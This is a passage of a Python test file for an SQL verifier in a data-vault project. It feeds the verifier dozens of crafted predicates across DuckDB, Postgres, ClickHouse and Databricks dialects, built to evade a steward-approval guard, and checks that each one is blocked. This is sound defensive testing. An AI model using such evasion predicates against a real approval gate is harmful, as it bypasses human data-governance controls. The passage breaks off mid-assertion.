        nullif_node = ast.find(sqlglot.exp.Nullif)
        assert nullif_node is not None
        assert is_bool_or_null_expr(nullif_node) is False, fp_q

    # 5c. 79/79 DuckDB catalog aggregates across all 8 dialects (0 misses)
    agg_rows = ddb.execute(
        "SELECT DISTINCT lower(function_name) FROM duckdb_functions() "
        "WHERE function_type='aggregate' AND lower(function_name) NOT LIKE '\\_\\_%' ESCAPE '\\' ORDER BY 1"
    ).fetchall()
    assert len(agg_rows) == 79
    agg_args = {
        "any_value": "NULL", "approx_quantile": "NULL::DOUBLE, 0.5", "approx_top_k": "NULL::INT, 2",
        "arg_max": "NULL::INT, 1", "arg_max_null": "NULL::INT, 1", "arg_min": "NULL::INT, 1",
        "arg_min_null": "NULL::INT, 1", "argmax": "NULL::INT, 1", "argmin": "NULL::INT, 1",
        "max_by": "NULL::DOUBLE, 1", "min_by": "NULL::DOUBLE, 1", "bitstring_agg": "NULL::INT",
        "corr": "NULL::DOUBLE, 1.0", "covar_pop": "NULL::DOUBLE, 1.0", "covar_samp": "NULL::DOUBLE, 1.0",
        "decimal_average": "NULL::DECIMAL(10,2)", "histogram_exact": "NULL::INT, [1, 2]",
        "lttb": "NULL::DOUBLE, NULL::DOUBLE, 2", "quantile": "NULL::DOUBLE, 0.5",
        "quantile_cont": "NULL::DOUBLE, 0.5", "quantile_disc": "NULL::DOUBLE, 0.5",
        "regr_avgx": "NULL::DOUBLE, 1.0", "regr_avgy": "NULL::DOUBLE, 1.0", "regr_count": "NULL::DOUBLE, 1.0",
        "regr_intercept": "NULL::DOUBLE, 1.0", "regr_r2": "NULL::DOUBLE, 1.0",
        "regr_slope": "NULL::DOUBLE, 1.0", "regr_sxx": "NULL::DOUBLE, 1.0",
        "regr_sxy": "NULL::DOUBLE, 1.0", "regr_syy": "NULL::DOUBLE, 1.0",
        "reservoir_quantile": "NULL::DOUBLE, 0.5", "string_agg": "NULL::VARCHAR, ','",
        "group_concat": "NULL::VARCHAR, ','", "listagg": "NULL::VARCHAR, ','",
        "variant_group_object": "'a', NULL", "count_star": "", "combine_aggr": "NULL::DOUBLE",
    }
    skip_null_over = {
        "count", "count_star", "regr_count", "array_agg", "list",
        "approx_count_distinct", "variant_group_object",
    }
    for (fn,) in agg_rows:
        args = agg_args.get(fn, "NULL::DOUBLE")
        sat_args = (
            "" if fn == "count_star"
            else args.replace("NULL::DOUBLE", "s.id").replace("NULL::INT", "s.id")
            .replace("NULL::VARCHAR", "s.hk").replace("NULL::DECIMAL(10,2)", "s.id")
            .replace("NULL", "s.id")
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {fn}({sat_args}) = 1"
        )
        for tid in SQL_TARGET_IDS:
            d = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
            assert any(
                diag.rule_id in ("DV-AST-006", "EVAL-AST-01") and diag.severity == "BLOCKER"
                for diag in verifier.verify_sql(sat_sql, tid)
            ), (tid, fn)
            if fn not in skip_null_over:
                over_sql = (
                    f"(SELECT {fn}({args}) OVER () FROM (SELECT 1) AS t)"
                    if tid == "duckdb_local"
                    else f"(SELECT {fn}(NULL) OVER () FROM (SELECT 1) AS t)"
                )
                try:
                    over_ast = sqlglot.parse_one(over_sql, read=d)
                except sqlglot.ParseError:
                    assert tid != "duckdb_local", (tid, fn)
                    continue
                assert is_bool_or_null_expr(over_ast) is True, (tid, fn)

    valid_controls = (
        ("duckdb_local", "NULLIF(-9007199254740993 % 2, 0)", "NULLIF(-9007199254740993 % 2, 0) = ANY(ARRAY[-1])"),
        ("duckdb_local", "NULLIF(0.5 + 0.25, 0.5)", "NULLIF(0.5 + 0.25, 0.5) = ANY(ARRAY[0.75])"),
        ("duckdb_local", "JSON_EXTRACT_STRING(s.meta_json, '$.a')", "JSON_EXTRACT_STRING(s.meta_json, '$.a') = ANY(s.arr)"),
        ("duckdb_local", "TRY(1 + 2)", "TRY(1 + 2) = ANY(ARRAY[3])"),
        ("duckdb_local", "CAST(TRY_CAST(1 AS BOOLEAN) AS VARCHAR)", "CAST(TRY_CAST(1 AS BOOLEAN) AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "TRY_CAST(1e40 AS DOUBLE)", "TRY_CAST(1e40 AS DOUBLE) = ANY(ARRAY[1e40])"),
        ("duckdb_local", "NULLIF(1, (SELECT 1 AS y WHERE s.id = 99))", "NULLIF(1, (SELECT 1 AS y WHERE s.id = 99)) = ANY(ARRAY[1])"),
        ("duckdb_local", "NULLIF(1, (SELECT 1 AS y WHERE id = 99))", "NULLIF(1, (SELECT 1 AS y WHERE id = 99)) = ANY(ARRAY[1])"),
    )
    for ok_tid, ctrl_expr, ok_pred in valid_controls:
        assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone()[0] is not None, (
            ctrl_expr
        )
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)
    ddb.close()

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter43_r10_subq_order_window_distinct_prewhere_and_ch_aggs() -> None:
    """Remediate r10 Select/Subquery scoping and ClickHouse ParameterizedAgg/CombinedAggFunc."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, arr VARCHAR[])"
    )
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', ['ok'])")

    live_preds = (
        "NULLIF(1, (SELECT 1 AS x WINDOW w AS (PARTITION BY x))) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x WINDOW w AS (ORDER BY x))) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT DISTINCT ON (x) 1 AS x)) = ALL(SELECT 1 WHERE FALSE)",
        (
            "NULLIF(1, (SELECT 1 AS x FROM (SELECT 1) AS t WINDOW w AS (PARTITION BY x)))"
            " = ALL(SELECT 1 WHERE FALSE)"
        ),
        "NULLIF(1, ((VALUES (1)) ORDER BY col0 LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, ((VALUES (2), (1)) ORDER BY col0 LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, ((SELECT 1 AS y) ORDER BY y LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        (
            "NULLIF(1, ((SELECT 1 AS y UNION ALL SELECT 2 AS y) ORDER BY y LIMIT 1))"
            " = ALL(SELECT 1 WHERE FALSE)"
        ),
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    dialect_blocked = (
        *(("duckdb_local", p) for p in live_preds),
        (
            "postgres",
            "NULLIF(1, (SELECT 1 AS x WINDOW w AS (PARTITION BY x))) = ALL(SELECT 1 WHERE FALSE)",
        ),
        ("postgres", "NULLIF(1, (SELECT DISTINCT ON (x) 1 AS x)) = ALL(SELECT 1 WHERE FALSE)"),
        ("postgres", "NULLIF(1, ((VALUES (1)) ORDER BY column1 LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("postgres", "NULLIF(1, ((SELECT 1 AS y) ORDER BY y LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "NULLIF(1, (SELECT 1 AS y PREWHERE y = 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "NULLIF(1, ((SELECT 1 AS y) ORDER BY y LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExact(0.5)(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "histogram(5)(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "histogramIf(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "sumIf(NULL, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "sumOrNull(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "avgOrNull(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "countOrNull(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactIf(0.5)(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "quantileExactOrNull(0.5)(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    )
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls = (
        (
            "duckdb_local",
            "NULLIF(1, (SELECT 1 AS y WHERE s.id = 99))",
            "NULLIF(1, (SELECT 1 AS y WHERE s.id = 99)) = ANY(ARRAY[1])",
        ),
        (
            "duckdb_local",
            "NULLIF(1, (SELECT 1 AS y WHERE id = 99))",
            "NULLIF(1, (SELECT 1 AS y WHERE id = 99)) = ANY(ARRAY[1])",
        ),
        (
            "duckdb_local",
            "NULLIF(1, ((SELECT 1 AS y WHERE s.id = 99) ORDER BY y LIMIT 1))",
            "NULLIF(1, ((SELECT 1 AS y WHERE s.id = 99) ORDER BY y LIMIT 1)) = ANY(ARRAY[1])",
        ),
        (
            "duckdb_local",
            "(SELECT l.b FROM (SELECT TRUE AS x) AS t, LATERAL (SELECT t.x AS b) AS l)",
            "(SELECT l.b FROM (SELECT TRUE AS x) AS t, LATERAL (SELECT t.x AS b) AS l) = TRUE",
        ),
        ("clickhouse", None, "sumIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", None, "quantileExact(0.5)(1) OVER () = 1"),
    )
    for ok_tid, ctrl_expr, ok_pred in valid_controls:
        if ctrl_expr is not None:
            assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone()[0] is not None, (
                ctrl_expr
            )
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)
    ddb.close()

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter44_r11_nonfiltering_nullif_and_clickhouse_aggs() -> None:
    """Remediate r11 non-filtering NULLIF clauses and ClickHouse chained/camelCase aggs."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._guard_common import _AGG_ANONYMOUS_NAMES
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute("CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR)")
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED')")

    live_preds = (
        "NULLIF(1, (SELECT DISTINCT ON (s.id) 1 AS x)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x WINDOW w AS (PARTITION BY s.id))) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x ORDER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, ((SELECT 1 AS x) ORDER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x GROUP BY s.id)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, ((VALUES (1)) ORDER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    dialect_blocked: list[tuple[str, str]] = [
        *(("duckdb_local", p) for p in live_preds),
        ("postgres", "NULLIF(1, (SELECT DISTINCT ON (s.id) 1 AS x)) = ALL(SELECT 1 WHERE FALSE)"),
        ("postgres", "NULLIF(1, (SELECT 1 AS x WINDOW w AS (PARTITION BY s.id))) = ALL(SELECT 1 WHERE FALSE)"),
        ("postgres", "NULLIF(1, ((SELECT 1 AS x) ORDER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "NULLIF(1, ((SELECT 1 AS x) ORDER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "topKOrNullIf(3)(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "groupBitAndOrNullIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "groupBitOrOrNullIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "groupBitXorOrNullIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "sumMapOrNullIf([1], [1], 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyHeavyOrNullIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "singleValueOrNull(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "first_valueIf(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "last_valueIf(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "nth_valueIf(NULL, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyHeavy(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "anyHeavyIf(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevSamp(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevSamp(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevSampIf(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevSampIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varSamp(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varSamp(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varSampIf(NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varSampIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "covarSamp(NULL, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stddevPop(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "varPop(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "covarPop(NULL, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "skewPop(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "skewSamp(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "kurtPop(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "kurtSamp(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "stringAgg(NULL, ',') OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "APPROX_PERCENTILE(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "HLL_ESTIMATE(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "MULTIMAP_AGG(NULL, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "VARIANT_GROUP_OBJECT('a', NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "XMLAGG(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    ]
    for agg_nm in sorted(_AGG_ANONYMOUS_NAMES):
        dialect_blocked.append(
            ("clickhouse", f"{agg_nm}OrNullIf(1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)")
        )

    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(pred.split(" = ALL")[0], read=dialect)) is True, (
            tid, pred
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    valid_controls = (
        ("duckdb_local", "NULLIF(1, (SELECT 1 AS x WHERE s.id = 99))", "NULLIF(1, (SELECT 1 AS x WHERE s.id = 99)) = ANY(ARRAY[1])"),
        ("duckdb_local", "NULLIF(1, (SELECT 1 AS x HAVING s.id = 99))", "NULLIF(1, (SELECT 1 AS x HAVING s.id = 99)) = ANY(ARRAY[1])"),
        (
            "duckdb_local",
            "NULLIF(1, (SELECT 1 AS x QUALIFY ROW_NUMBER() OVER () = 1 AND s.id = 99))",
            "NULLIF(1, (SELECT 1 AS x QUALIFY ROW_NUMBER() OVER () = 1 AND s.id = 99)) = ANY(ARRAY[1])",
        ),
        (
            "duckdb_local",
            "(SELECT l.b FROM (SELECT TRUE AS x) AS t, LATERAL (SELECT t.x AS b) AS l)",
            "(SELECT l.b FROM (SELECT TRUE AS x) AS t, LATERAL (SELECT t.x AS b) AS l) = TRUE",
        ),
        ("clickhouse", None, "sumIf(1, 1 = 1) OVER () = 1"),
        ("clickhouse", None, "quantileExact(0.5)(1) OVER () = 1"),
        ("clickhouse", None, "countOrDefault(1) OVER () = 1"),
    )
    for ok_tid, ctrl_expr, ok_pred in valid_controls:
        if ctrl_expr is not None:
            assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone()[0] is not None, (
                ctrl_expr
            )
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)
    ddb.close()

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter45_r12_databricks_sort_distribute_cluster_and_ch_median_window() -> None:
    """Remediate r12 Databricks SORT/DISTRIBUTE/CLUSTER NULLIF, ClickHouse median*/SimpleState, and NTH_VALUE/lagInFrame/leadInFrame."""
    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._bool_expr_vocab import NON_FILTER_ARGS
    from opendv.storage._steward_guard import has_steward_approved_guard

    assert "qualify" not in NON_FILTER_ARGS
    assert {"sort", "distribute", "cluster"} <= set(NON_FILTER_ARGS)

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ch_medians = (
        "medianExact",
        "medianExactLow",
        "medianExactHigh",
        "medianExactWeighted",
        "medianTiming",
        "medianTimingWeighted",
        "medianDeterministic",
        "medianTDigest",
        "medianTDigestWeighted",
        "medianBFloat16",
        "medianBFloat16Weighted",
        "medianDD",
        "medianInterpolatedWeighted",
    )

    dialect_blocked: list[tuple[str, str]] = [
        # Item 1: Databricks SORT BY / DISTRIBUTE BY / CLUSTER BY + LIMIT 1
        ("databricks_uc", "NULLIF(1, (SELECT 1 AS x SORT BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "NULLIF(1, (SELECT 1 AS x DISTRIBUTE BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "NULLIF(1, (SELECT 1 AS x CLUSTER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "NULLIF(1, ((SELECT 1 AS x) SORT BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "NULLIF(1, ((SELECT 1 AS x) DISTRIBUTE BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "NULLIF(1, ((SELECT 1 AS x) CLUSTER BY s.id LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        # Item 2: ClickHouse avgWeighted, topKWeighted, SimpleState
        ("clickhouse", "avgWeighted(NULL, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "avgWeighted(1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "topKWeighted(3)(NULL, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "sumOrNullSimpleState(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "countOrNullSimpleState(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "medianExactOrNullSimpleState(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        # Item 3: ClickHouse combinator NTH_VALUE and lagInFrame/leadInFrame
        ("clickhouse", "nth_valueIf(1, 2, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "nth_valueIf(NULL, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "nth_valueOrNull(1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "nth_valueOrNullIf(1, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrame(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrame(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrame(1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrame(1, 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrame(1, 1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrame(1, 1, NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameIf(1, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrameIf(1, 1, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameIf(1, 1, NULL, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameOrNull(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrameOrNull(1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameOrNull(1, 0) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "leadInFrameOrNull(1, 1, 99) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "lagInFrameOrNullIf(1, 0, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
    ]
    for fn in ch_medians:
        args_null = "NULL, 1" if ("Weighted" in fn or fn == "medianDeterministic") else "NULL"
        args_val = "1, 1" if ("Weighted" in fn or fn == "medianDeterministic") else "1"
        dialect_blocked.extend([
            ("clickhouse", f"{fn}({args_null}) OVER () = ALL(SELECT 1 WHERE FALSE)"),
            ("clickhouse", f"{fn}OrNull({args_val}) OVER () = ALL(SELECT 1 WHERE FALSE)"),
            ("clickhouse", f"{fn}OrNullIf({args_val}, 1 = 1) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ])
        for sat_sql in (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {fn}(s.id) = 1",
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT 'h', CURRENT_TIMESTAMP, 'SRC', {fn}OrNull({args_val}) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        ):
            diags = verifier.verify_sql(sat_sql, "clickhouse")
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in diags), (
